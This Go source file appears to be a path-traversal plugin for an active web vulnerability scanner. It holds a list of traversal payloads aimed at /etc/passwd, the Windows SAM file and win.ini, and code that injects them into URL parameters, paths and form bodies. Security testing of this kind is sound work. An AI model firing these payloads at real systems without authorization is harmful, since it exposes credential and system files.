package plugins

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"hackmitm-desktop/internal/activescan"
)

// TraversalPlugin detects path traversal vulnerabilities
type TraversalPlugin struct {
	*BasePlugin
}

// NewTraversalPlugin creates a new path traversal detection plugin
func NewTraversalPlugin() *TraversalPlugin {
	payloads := []string{
		// Basic traversal
		"../",
		"../../",
		"../../../",
		"../../../../",
		"../../../../../",
		"../../../../../../",
		"../../../../../../../",
		"../../../../../../../../",
		// With common files
		"../../../etc/passwd",
		"../../../../etc/passwd",
		"../../../../../etc/passwd",
		"../../../../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"..\\..\\..\\..\\windows\\win.ini",
		"../../../windows/win.ini",
		"../../../../windows/win.ini",
		// URL encoded
		"..%2f",
		"..%2f..%2f",
		"..%2f..%2f..%2f",
		"%2e%2e/",
		"%2e%2e%2f",
		"%2e%2e%2f%2e%2e%2f",
		"..%252f",
		"..%c0%af",
		"..%c1%9c",
		// Double encoding
		"..%252f..%252f..%252f",
		// NULL byte
		"../../../etc/passwd%00",
		"../../../etc/passwd%00.jpg",
		// Wrapper schemes
		"file:///etc/passwd",
		"file:///c:/windows/win.ini",
		// Other variations
		"....//",
		"....//....//",
		"..//",
		"..//..//",
	}

	return &TraversalPlugin{
		BasePlugin: NewBasePlugin(
			"PATH-TRAVERSAL",
			"Path Traversal",
			"Detects path traversal vulnerabilities that allow reading files outside web root",
			activescan.SeverityHigh,
			payloads,
		),
	}
}

// Scan performs path traversal testing on the target
func (p *TraversalPlugin) Scan(target *activescan.Target, client *http.Client, config *activescan.ScanConfig) ([]*activescan.Finding, error) {
	var findings []*activescan.Finding

	// Patterns that indicate successful traversal
	successPatterns := []string{
		// Linux
		"root:x:0:0:",
		"daemon:x:1:1:",
		"nobody:x:",
		"[font]",
		"[extensions]",
		"[files]",
		// Windows
		"[boot loader]",
		"[operating systems]",
		"bitmaps",
		"device=",
		// Common file content
		"localhost",
		"127.0.0.1",
		"mysql",
		"postgres",
	}

	for _, payload := range p.Payloads() {
		// Test URL parameters
		f := p.testInURL(target, client, config, payload, successPatterns)
		if f != nil {
			findings = append(findings, f)
		}

		// Test path segments
		f = p.testInPath(target, client, config, payload, successPatterns)
		if f != nil {
			findings = append(findings, f)
		}

		// Test body parameters
		f = p.testInBody(target, client, config, payload, successPatterns)
		if f != nil {
			findings = append(findings, f)
		}
	}

	return findings, nil
}

func (p *TraversalPlugin) testInURL(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string, patterns []string) *activescan.Finding {
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	query := parsedURL.Query()
	for param := range query {
		originalValue := query.Get(param)
		query.Set(param, originalValue+payload)
		parsedURL.RawQuery = query.Encode()

		resp, body, err := SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
		if err != nil {
			query.Set(param, originalValue)
			continue
		}

		// Check for success indicators
		if p.isTraversalSuccessful(resp, body, patterns) {
			request := fmt.Sprintf("%s %s\nPayload: %s -> %s", target.Method, parsedURL.String(), param, payload)
			finding := CreateFinding(p.BasePlugin, target, payload, "Path traversal successful - file content detected", request, body)
			finding.Confidence = p.calculateConfidence(body)
			return finding
		}

		query.Set(param, originalValue)
	}

	return nil
}

func (p *TraversalPlugin) testInPath(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string, patterns []string) *activescan.Finding {
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	// Test payload in path
	originalPath := parsedURL.Path

	// Try adding payload at the end
	parsedURL.Path = originalPath + payload
	resp, body, err := SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
	if err == nil && p.isTraversalSuccessful(resp, body, patterns) {
		request := fmt.Sprintf("%s %s", target.Method, parsedURL.String())
		finding := CreateFinding(p.BasePlugin, target, payload, "Path traversal in URL path", request, body)
		finding.Confidence = p.calculateConfidence(body)
		return finding
	}

	// Try replacing the last path segment
	segments := strings.Split(originalPath, "/")
	if len(segments) > 1 {
		segments[len(segments)-1] = payload
		parsedURL.Path = strings.Join(segments, "/")
		resp, body, err = SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
		if err == nil && p.isTraversalSuccessful(resp, body, patterns) {
			request := fmt.Sprintf("%s %s", target.Method, parsedURL.String())
			finding := CreateFinding(p.BasePlugin, target, payload, "Path traversal in URL path segment", request, body)
			finding.Confidence = p.calculateConfidence(body)
			return finding
		}
	}

	return nil
}

func (p *TraversalPlugin) testInBody(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string, patterns []string) *activescan.Finding {
	if target.Method == "GET" || target.Body == "" {
		return nil
	}

	contentType := ""
	for k, v := range target.Headers {
		if strings.ToLower(k) == "content-type" {
			contentType = v
			break
		}
	}

	if strings.Contains(contentType, "application/x-www-form-urlencoded") {
		formData, err := url.ParseQuery(target.Body)
		if err != nil {
			return nil
		}

		for param := range formData {
			originalValue := formData.Get(param)
			formData.Set(param, originalValue+payload)

			resp, body, err := SendRequest(client, target.Method, target.URL, target.Headers, []byte(formData.Encode()))
			if err != nil {
				formData.Set(param, originalValue)
				continue
			}

			if p.isTraversalSuccessful(resp, body, patterns) {
				request := fmt.Sprintf("%s %s\nBody: %s", target.Method, target.URL, formData.Encode())
				finding := CreateFinding(p.BasePlugin, target, payload, "Path traversal in form parameter", request, body)
				finding.Confidence = p.calculateConfidence(body)
				return finding
			}

			formData.Set(param, originalValue)
		}
	}

	return nil
}

func (p *TraversalPlugin) isTraversalSuccessful(resp *http.Response, body string, patterns []string) bool {
	// Check HTTP status - 200 usually means success
	if resp.StatusCode != 200 {
		return false
	}

	// Check for file content patterns
	bodyLower := strings.ToLower(body)
	for _, pattern := range patterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return true
		}
	}

	// Check for absence of typical error messages
	errorIndicators := []string{
		"not found",
		"access denied",
		"permission denied",
		"forbidden",
		"error",
		"does not exist",
		"invalid path",
	}

	for _, indicator := range errorIndicators {
		if strings.Contains(bodyLower, indicator) {
			return false
		}
	}

	// Check content type
	contentType := resp.Header.Get("Content-Type")
	if strings.Contains(contentType, "text/plain") || strings.Contains(contentType, "application/octet-stream") {
		// Plain text or binary might be file content
		if len(body) > 0 && len(body) < 10000 {
			// Reasonable file size
			return true
		}
	}

	return false
}

func (p *TraversalPlugin) calculateConfidence(body string) int {
	confidence := 60 // Base confidence

	// Known file signatures increase confidence
	if strings.Contains(body, "root:x:0:0:") {
		confidence = 95 // /etc/passwd found
	} else if strings.Contains(body, "[boot loader]") {
		confidence = 95 // boot.ini found
	} else if strings.Contains(body, "[fonts]") {
		confidence = 90 // win.ini found
	}

	return confidence
}
